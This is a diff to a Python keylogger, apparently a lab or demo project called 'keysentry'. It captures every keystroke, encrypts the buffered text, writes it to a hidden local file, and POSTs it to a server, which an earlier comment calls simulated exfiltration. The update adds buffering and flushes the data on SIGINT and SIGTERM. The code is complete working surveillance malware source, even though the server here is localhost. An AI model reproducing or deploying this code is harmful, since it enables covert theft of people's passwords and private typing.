@@ -1,4 +1,5 @@
-# Captures keystrokes, encrypts with Fernet, logs with timestamps
+# keysentry/keylogger.py
+# UPDATED: Handles termination signals properly to save data before exiting.
 
 from pynput import keyboard
 from cryptography.fernet import Fernet
@@ -7,9 +8,20 @@ import base64
 import os
 import sys
 import requests
+import signal
+import threading
+import time
 
-# Step 1: Load encryption key from file
+# ========== Setup ==========
 key_path = "key.key"
+log_file = ".keylog.txt"
+# IMPORTANT: Ensure this matches your dashboard port (5001)
+server_url = "http://127.0.0.1:5001/receive-log"
+
+buffer = []
+buffer_lock = threading.Lock()
+
+# ========== Load Encryption Key ==========
 if not os.path.exists(key_path):
     print("❌ Encryption key not found. Please run keygen.py first.")
     sys.exit(1)
@@ -17,56 +29,69 @@ if not os.path.exists(key_path):
 with open(key_path, "rb") as key_file:
     key = key_file.read()
 
-# Initialize Fernet with loaded key
 fernet = Fernet(key)
 
-# Step 2: Define output file for local logs (hidden for stealth)
-log_file = ".keylog.txt"
+# ========== Flush Buffer ==========
+def flush_buffer():
+    """Encrypts buffer and sends it to the server/local file."""
+    with buffer_lock:
+        if not buffer:
+            return
+        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+        data = ''.join(buffer)
+        buffer.clear()
 
-# Step 3: Encrypt and log each keystroke
-def write_encrypted_log(data):
-    """
-    Encrypts a single keystroke with a timestamp.
-    Logs to a local file and sends encrypted data to the server.
-    """
-    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
-    log_entry = f"[{timestamp}] {data}\n"
-
+    print(f"📦 Encrypting {len(data)} keystrokes...")
+    log_entry = f"[{timestamp}] {data}"
     encrypted = fernet.encrypt(log_entry.encode())
     encoded = base64.b64encode(encrypted)
 
-    # Save encrypted+base64 locally
+    # 1. Save locally
     with open(log_file, "ab") as file:
         file.write(encoded + b"\n")
 
-    # Simulate exfiltration: POST to remote Flask server
+    # 2. Send to server
     try:
-        response = requests.post("http://127.0.0.1:5000/receive-log", data=encrypted)
+        response = requests.post(server_url, data=encrypted, timeout=2)
         if response.status_code == 200:
-            print("📤 Log sent to server successfully.")
+            print("📤 Buffer sent to server successfully.")
         else:
-            print(f"⚠️ Server responded with: {response.status_code}")
+            print(f"⚠️ Server returned error: {response.status_code}")
     except Exception as e:
         print(f"❌ Failed to send to server: {e}")
 
-# Step 4: Key press handler (runs on each key event)
+# ========== Handle Keystrokes ==========
 def on_press(key):
-    """
-    Handles a single key press event.
-    Logs the character or special key (e.g., space, enter).
-    """
-    if key == keyboard.Key.esc:
-        print("🛑 Keylogger stopped.")
-        return False  # Stops the listener
-
     try:
-        # Alphanumeric key
-        write_encrypted_log(key.char)
+        k = key.char
     except AttributeError:
-        # Special key (e.g., space, enter, ctrl)
-        write_encrypted_log(f"[{key.name}]")
+        # Format special keys cleanly
+        if key == keyboard.Key.space:
+            k = " "
+        elif key == keyboard.Key.enter:
+            k = "[ENTER]\n"
+        else:
+            k = f"[{key.name}]"
 
-# Step 5: Start keyboard listener
-print("🟢 Keylogger started. Press ESC to stop.")
+    with buffer_lock:
+        buffer.append(k)
+
+# ========== Handle Exit Signals (SIGINT & SIGTERM) ==========
+def handle_exit(signal_received, frame):
+    print(f"\n🛑 Exiting (Signal {signal_received}). Flushing buffer...")
+    flush_buffer()
+    # Give the file operations a split second to finish
+    time.sleep(0.5) 
+    sys.exit(0)
+
+# Catch Ctrl+C (2) and Termination (15)
+signal.signal(signal.SIGINT, handle_exit)
+signal.signal(signal.SIGTERM, handle_exit)
+
+# ========== Start Keylogger ==========
+print(f"🟢 Keylogger started (Target: {server_url})")
+print("   Press Ctrl+C in the launcher to stop and save logs.")
+
+# Blocking listener
 with keyboard.Listener(on_press=on_press) as listener:
     listener.join()
